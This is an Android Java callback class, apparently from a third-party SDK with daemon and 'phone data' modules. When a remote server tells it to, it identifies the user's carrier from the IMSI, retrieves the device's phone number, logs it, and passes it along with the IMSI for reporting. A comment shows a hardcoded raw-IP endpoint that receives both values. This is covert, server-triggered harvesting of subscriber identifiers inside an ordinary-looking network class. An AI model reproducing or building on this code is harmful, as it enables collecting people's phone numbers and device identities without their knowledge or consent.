package com.thirdparty.net;

import android.content.Context;
import android.text.TextUtils;
import android.util.Log;

import com.gandalf.daemon.utils.XL_log;
import com.shoujishuju.Service;
import com.shoujishuju.enums.ISPType;
import com.thirdparty.engine.ServiceStub;
import com.zhy.http.okhttp.callback.Callback;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Call;
import okhttp3.Response;

public class GetPhoneNumCallback extends Callback<String> {
    private static final XL_log log = new XL_log(GetPhoneNumCallback.class);
    private Context mContext = null;
    private String imsi;

    public GetPhoneNumCallback(Context context, String imsi) {
        super();
        this.mContext = context;
        this.imsi = imsi;
    }

    @Override
    public void onError(Call call, Exception exception, int code) {
        if (exception != null) {
            log.error("GetPhoneNumCallback:" + Log.getStackTraceString(exception) + " code:" + code);
        } else {
            log.error("GetPhoneNumCallback exception and exception is null");
        }
    }

    @Override
    public String parseNetworkResponse(Response response, int code) throws Exception {
        log.debug("GetPhoneNumCallback");
        if (response == null)
            return null;
        String responeBody = response.body().string();
        if (!TextUtils.isEmpty(responeBody)) {
            log.debug("respone body :" + responeBody);
            parseTaskFromRespone(responeBody);
        }
        return null;
    }

    @Override
    public void onResponse(String kpa, int arg1) {
        // TODO Auto-generated method stub
    }

    private void parseTaskFromRespone(String response) {
        if (TextUtils.isEmpty(response)) {
            return;
        }
        try {
            JSONObject obj = new JSONObject(response);
            if (obj.getString("isNeedGetNum").equals("1")) {
                Service service = new Service();
                String mobile;
                if (imsi.startsWith("46000") || imsi.startsWith("46002") || imsi.startsWith("46007"))
                    mobile = service.getMobile(ISPType.CMCC);
                else {
                    mobile = service.getMobile(ISPType.CTCC);
                }
                log.debug("GetPhoneNumCallback mobile " + imsi + "  " + mobile);
                if (mobile != null) {
                    //http://103.229.215.159:8080/api/upgprsnum?pid=10003&cid=0&imsi=460013798217927&mobile=13300000001，
                    ServiceStub.getInstance(mContext).setIsPhoneNumInited(true, mobile, imsi);
                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }
    }


}
